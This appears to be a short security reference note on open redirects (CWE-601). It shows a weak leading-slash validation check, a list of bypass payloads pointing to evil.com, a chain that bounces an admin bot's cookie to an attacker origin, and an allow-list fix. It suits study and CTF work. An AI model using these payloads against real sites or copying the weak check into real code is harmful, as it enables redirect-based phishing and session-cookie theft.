---
type: reference
category: Payloads
tags: [reference, payloads, web, open-redirect]
---

# Open Redirect

A `next`/`url`/`redirect`/`return` parameter whose target is validated with a weak check. Backed by [[Cookie Security Protocol]] (CWE-601).

## Weak check to look for
```python
def is_safe_next(target):
    return bool(target) and target.startswith("/")   # only checks one leading slash
```

## Payloads (bypass a leading-slash check)
```
//evil.com               protocol-relative -> browser resolves to external host
//evil.com/path
/\evil.com               backslash variants some parsers mishandle
https://evil.com
/%2f%2fevil.com          encoded double slash
```
A value like `//callback/<path>` still "starts with `/`" but navigates cross-origin.

## Why it matters (chaining)
- Bounce an authenticated admin bot off the redirect (`/login?next=//callback/<path>`) so its `SameSite=None; Secure` cookie rides along to an attacker origin -> cookie/flag capture.
- Combine with missing `frame-ancestors`/`X-Frame-Options`, a CSRF-token leak, and a cross-site authenticated POST to escalate (full chain in [[Cookie Security Protocol]]).

## Fix
Resolve/parse the target and compare against an explicit allow-list of in-app paths or hosts. Never trust a prefix check.

## Related
- [[Web App Methodology]], [[Cookie Security Protocol]]
